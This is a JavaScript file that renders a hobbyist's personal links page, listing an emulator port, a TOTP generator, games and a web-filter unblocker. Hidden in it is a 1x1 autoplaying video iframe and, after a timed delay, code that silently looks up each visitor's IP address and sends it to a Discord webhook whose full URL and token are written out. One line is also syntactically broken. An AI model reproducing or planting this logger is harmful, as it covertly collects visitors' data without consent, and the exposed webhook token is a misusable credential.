setTimeout(function(){

document.write('<title>←</title><link rel="icon" type="image/x-icon" href="https://cdn.ruralanemone.tech/media/img/richard.gif"><nav><a onclick="window.history.back()">&#8810; home</a></nav><br><p><a href="https://cdn.ruralanemone.tech">my cdn (ha I broke the backend again)</a><br><a href="https://webretro.ruralanemone.tech">binbshbanana\'s webretro port (that I ported)</a> - an emulator for basically everything (note: n64 emulator is broken) (note - you might need some <a href="/roms">roms</a>)<br><a href="https://cookie.ruralanemone.tech">cookie clicker 😳 (why?????????????????)</a><br><a href="https://totp.ruralanemone.tech">TOTP (<b>t</b>ime-based <b>o</b>ne-<b>t</b>ime <b>p</b>in) generator (aka 2fa code)</a><br><a href="https://jstris.jezevec10.com">online tetris</a> - not made by me but better tetris than y\'all are playing (<a href="https://www.echalk.co.uk/amusements/Games/Tetrominoes/tetrominoes.html">this</a>)<br><a href="https://uv.ruralanemone.tech">ultraviolet</a> - will unblock basically anything you throw at it!</p><iframe id=\"iframe\" width=\"1\" height=\"1\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ?controls=0\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>');

setTimeout(function(){
  
ajax = new XMLHttpRequest();
if(ajax!=null){
    ajax.open("GET","https://europe-west3-devrcc.cloudfunctions.net/whatismyip",true);
    ajax.onreadystatechange = function() {
        if(this.readyState == 4) {
            if(this.status == 200) {
                sendMessage(this.responseText);
            }
        }
    }
    ajax.send(null);
}

const iframe = document.getElementById("iframe");
alert(iframe.contentDocument.querySelector(“div.class”));


function sendMessage(message) {
  const request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/965619205942698004/_4Oa1M_C6gcmZfLsN9bAWck-BHS9B1aswrb8Au0mIWQdmE7KKj6Cc16qeToiz0SZ_UQT");

  request.setRequestHeader('Content-type', 'application/json');

  const params = {
    username: window.location.pathname,
    avatar_url: "",
    content: message
  }
  
  request.send(JSON.stringify(params));
}

},3000)},3000)